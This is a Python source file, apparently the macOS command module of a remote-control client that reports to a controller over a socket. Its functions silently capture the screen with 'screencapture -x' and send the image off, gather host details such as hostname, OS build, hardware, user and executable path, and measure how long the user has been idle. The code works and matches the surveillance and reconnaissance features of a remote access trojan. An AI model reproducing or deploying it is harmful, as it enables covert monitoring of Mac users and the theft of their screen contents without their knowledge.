import os
import subprocess
import sys
import time

from client.util.CommonCommands import CommonCommands
from client.util.decorator import desc
from common.util import get_time, get_size, format_dict, logger


class MacCommands(CommonCommands):

    def __init__(self, socket):
        super().__init__(socket)

    @desc("grab a screenshot")
    def screenshot(self):
        filename = 'screenshot_{}.png'.format(get_time())
        command = f"screencapture -x {filename}"
        self.send_interim_result(1, f'Preparing to execute command: {command}')
        os.system(command)
        if os.path.isfile(filename):
            self.send_interim_result(1, 'Screenshot success')
            self.send_interim_result(1, f'Preparing to send file, length is {get_size(os.path.getsize(filename))}')
            self.socket.send_file(self.command_id, filename)
            os.remove(filename)
        else:
            self.send_final_result(0, 'Screenshot failed')

    @desc('get information')
    def getinfo(self):
        info = {}
        try:
            import platform
            import psutil
            info['hostname'] = platform.node()
            info['os_version'] = platform.mac_ver()[0]  # 获取 macOS 版本
            info['os_build'] = subprocess.getoutput('sw_vers -buildVersion')  # 构建版本号
            info['arch'] = platform.machine()
            info['model'] = subprocess.getoutput('sysctl -n hw.model').strip()  # Mac 型号
            info['cpu_brand'] = subprocess.getoutput('sysctl -n machdep.cpu.brand_string').strip()
            info['cpu_cores'] = os.cpu_count()
            info['mem'] = f'{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB'
            info['python_ver'] = platform.python_version()
            info['pid'] = os.getpid()
            info['current_user'] = psutil.Process().username()
            executable = os.path.realpath(sys.executable)
            argv = os.path.realpath(''.join(sys.argv))
            info['exec_path'] = f'{executable} {argv}'
            info['process_uptime'] = f'{round(time.time() - psutil.Process().create_time(), 2)}s'
        except Exception as e:
            logger.error(e)
        finally:
            return 1, format_dict(info)


    @desc('detect user inactive time')
    def idletime(self):
        from Quartz import CGEventSourceSecondsSinceLastEventType, kCGEventSourceStateHIDSystemState, kCGAnyInputEventType
        idle_time = CGEventSourceSecondsSinceLastEventType(
            kCGEventSourceStateHIDSystemState,
            kCGAnyInputEventType
        )
        return 1, 'User has been idle for: {} seconds'.format(idle_time)


    # @desc("获取macOS系统信息")
    # def get_mac_info(self):
    #     """获取macOS系统信息"""
    #     try:
    #         result = subprocess.run(
    #             ['system_profiler', 'SPHardwareDataType'],
    #             capture_output=True,
    #             text=True
    #         )
    #         return 1, result.stdout
    #     except Exception as e:
    #         return 0, str(e)
    #
    # @desc("获取macOS系统信息")
    # def list_applications(self):
    #     """列出已安装应用（macOS方式）"""
    #     try:
    #         apps = []
    #         for dir in ['/Applications', os.path.expanduser('~/Applications')]:
    #             if os.path.exists(dir):
    #                 apps.extend(os.listdir(dir))
    #         return 1, "\n".join(apps)
    #     except Exception as e:
    #         return 0, str(e)
